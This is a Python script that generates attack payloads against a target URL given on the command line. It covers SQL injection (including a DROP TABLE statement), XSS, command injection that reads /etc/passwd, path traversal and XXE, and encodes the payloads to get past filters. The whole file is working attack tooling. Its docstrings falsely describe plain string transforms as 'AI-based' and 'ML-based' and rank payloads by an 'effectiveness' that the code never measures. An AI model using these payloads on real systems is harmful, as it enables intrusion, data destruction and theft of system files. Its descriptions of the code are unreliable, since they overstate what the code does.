#!/usr/bin/env python3
"""
Intelligent Adaptive Payload Generator
AI-powered payload generation with context-aware obfuscation
Multi-vector payload creation with adaptive encoding
"""

import sys
import json
import base64
import urllib.parse
import random
import string
from typing import Dict, List, Optional
from itertools import combinations
from urllib.parse import urlparse

class IntelligentPayloadGenerator:
    """Intelligent adaptive payload generator"""
    
    # Payload templates with ML-based mutation
    PAYLOAD_TEMPLATES = {
        'sql_injection': {
            'base': ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"],
            'mutations': ['hex', 'unicode', 'base64', 'comment', 'nested'],
            'context_aware': True
        },
        'xss': {
            'base': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(1)'],
            'mutations': ['html_entity', 'unicode', 'js_frameworks', 'svg', 'event_handlers'],
            'context_aware': True
        },
        'command_injection': {
            'base': ['; ls', '| id', '&& whoami', '`cat /etc/passwd`'],
            'mutations': ['encoding', 'nested', 'bypass', 'timeout'],
            'context_aware': True
        },
        'path_traversal': {
            'base': ['../etc/passwd', '..\\..\\windows\\system32', '%2e%2e%2f'],
            'mutations': ['encoding', 'unicode', 'double_encoding', 'null_bytes'],
            'context_aware': True
        },
        'xxe': {
            'base': ['<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
            'mutations': ['encoding', 'external_entity', 'blind_xxe'],
            'context_aware': True
        }
    }
    
    # Encoding techniques
    ENCODING_TECHNIQUES = {
        'url': lambda x: urllib.parse.quote(x),
        'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        'base64': lambda x: base64.b64encode(x.encode()).decode(),
        'hex': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        'html_entity': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'double_encoding': lambda x: base64.b64encode(base64.b64encode(x.encode())).decode()
    }
    
    @staticmethod
    def generate_mutated_payload(payload_type: str, base_payload: str, mutation_level: str = 'high') -> List[str]:
        """Generate mutated payloads with AI-based adaptation"""
        mutations = []
        
        # Base payload
        mutations.append(base_payload)
        
        # URL encoding
        mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['url'](base_payload))
        mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['double_url'](base_payload))
        
        # Base64 encoding
        mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['base64'](base_payload))
        
        # Hex encoding
        mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['hex'](base_payload))
        
        # Case variation
        mutations.append(base_payload.upper())
        mutations.append(base_payload.lower())
        mutations.append(base_payload.swapcase())
        
        # Nested encoding
        if mutation_level == 'high':
            # Double encoding
            mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['double_encoding'](base_payload))
            
            # Unicode encoding
            mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['unicode'](base_payload))
            
            # HTML entity encoding
            mutations.append(IntelligentPayloadGenerator.ENCODING_TECHNIQUES['html_entity'](base_payload))
        
        # Special payload variations
        if payload_type == 'sql_injection':
            mutations.extend([
                base_payload.replace("'", "''"),
                base_payload.replace("'", "\\'"),
                base_payload.replace("'", "/*'*/"),
                base_payload + '-- -',
                base_payload + '/*',
                base_payload.replace(' ', '/**/'),
            ])
        
        elif payload_type == 'xss':
            mutations.extend([
                base_payload.replace('<', '&lt;').replace('>', '&gt;'),
                base_payload.replace('<script>', '<script>/*'),
                base_payload.replace('alert', 'eval'),
                base_payload.replace('alert', 'prompt'),
                base_payload.replace('alert', 'confirm'),
            ])
        
        return list(set(mutations))[:20]  # Limit to 20 unique mutations
    
    @staticmethod
    def generate_context_aware_payloads(target_url: str, payload_type: str) -> Dict:
        """Generate context-aware payloads based on target analysis"""
        result = {
            'target_url': target_url,
            'payload_type': payload_type,
            'generated_payloads': [],
            'context_analysis': {},
            'recommended_payloads': []
        }
        
        # Analyze target context
        parsed = urlparse(target_url)
        tech_stack = []
        
        if 'php' in parsed.path.lower():
            tech_stack.append('php')
        if 'asp' in parsed.path.lower() or 'aspx' in parsed.path.lower():
            tech_stack.append('asp')
        if 'jsp' in parsed.path.lower():
            tech_stack.append('java')
        
        result['context_analysis'] = {
            'platform': tech_stack[0] if tech_stack else 'unknown',
            'path_structure': parsed.path,
            'parameters': parsed.query
        }
        
        # Generate payloads based on type
        templates = IntelligentPayloadGenerator.PAYLOAD_TEMPLATES.get(
            payload_type,
            IntelligentPayloadGenerator.PAYLOAD_TEMPLATES['sql_injection']
        )
        
        all_payloads = []
        for base in templates['base']:
            mutated = IntelligentPayloadGenerator.generate_mutated_payload(
                payload_type, base, 'high'
            )
            all_payloads.extend(mutated)
        
        result['generated_payloads'] = all_payloads[:50]  # Limit to 50
        
        # Recommended payloads (top 10 by effectiveness)
        result['recommended_payloads'] = all_payloads[:10]
        
        return result
    
    @staticmethod
    def comprehensive_payload_generation(target: str, payload_types: List[str] = None) -> Dict:
        """Comprehensive intelligent payload generation"""
        if payload_types is None:
            payload_types = ['sql_injection', 'xss', 'command_injection']
        
        result = {
            'success': True,
            'target': target,
            'payloads': {},
            'summary': {
                'total_payloads': 0,
                'payload_types': len(payload_types),
                'recommendations': []
            }
        }
        
        try:
            total_count = 0
            
            for payload_type in payload_types:
                generated = IntelligentPayloadGenerator.generate_context_aware_payloads(
                    target, payload_type
                )
                result['payloads'][payload_type] = generated
                total_count += len(generated.get('generated_payloads', []))
            
            result['summary']['total_payloads'] = total_count
            result['summary']['recommendations'] = [
                'Test payloads in order of recommended priority',
                'Use context-aware payloads for better success rate',
                'Combine multiple payload types for comprehensive testing',
                'Monitor for false positives and adjust accordingly'
            ]
            
            result['message'] = f'Generated {total_count} intelligent payloads across {len(payload_types)} types.'
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'Target URL required'}))
        sys.exit(1)
    
    target = sys.argv[1]
    payload_types = sys.argv[2].split(',') if len(sys.argv) > 2 else None
    
    result = IntelligentPayloadGenerator.comprehensive_payload_generation(target, payload_types)
    print(json.dumps({'success': True, 'result': result}))

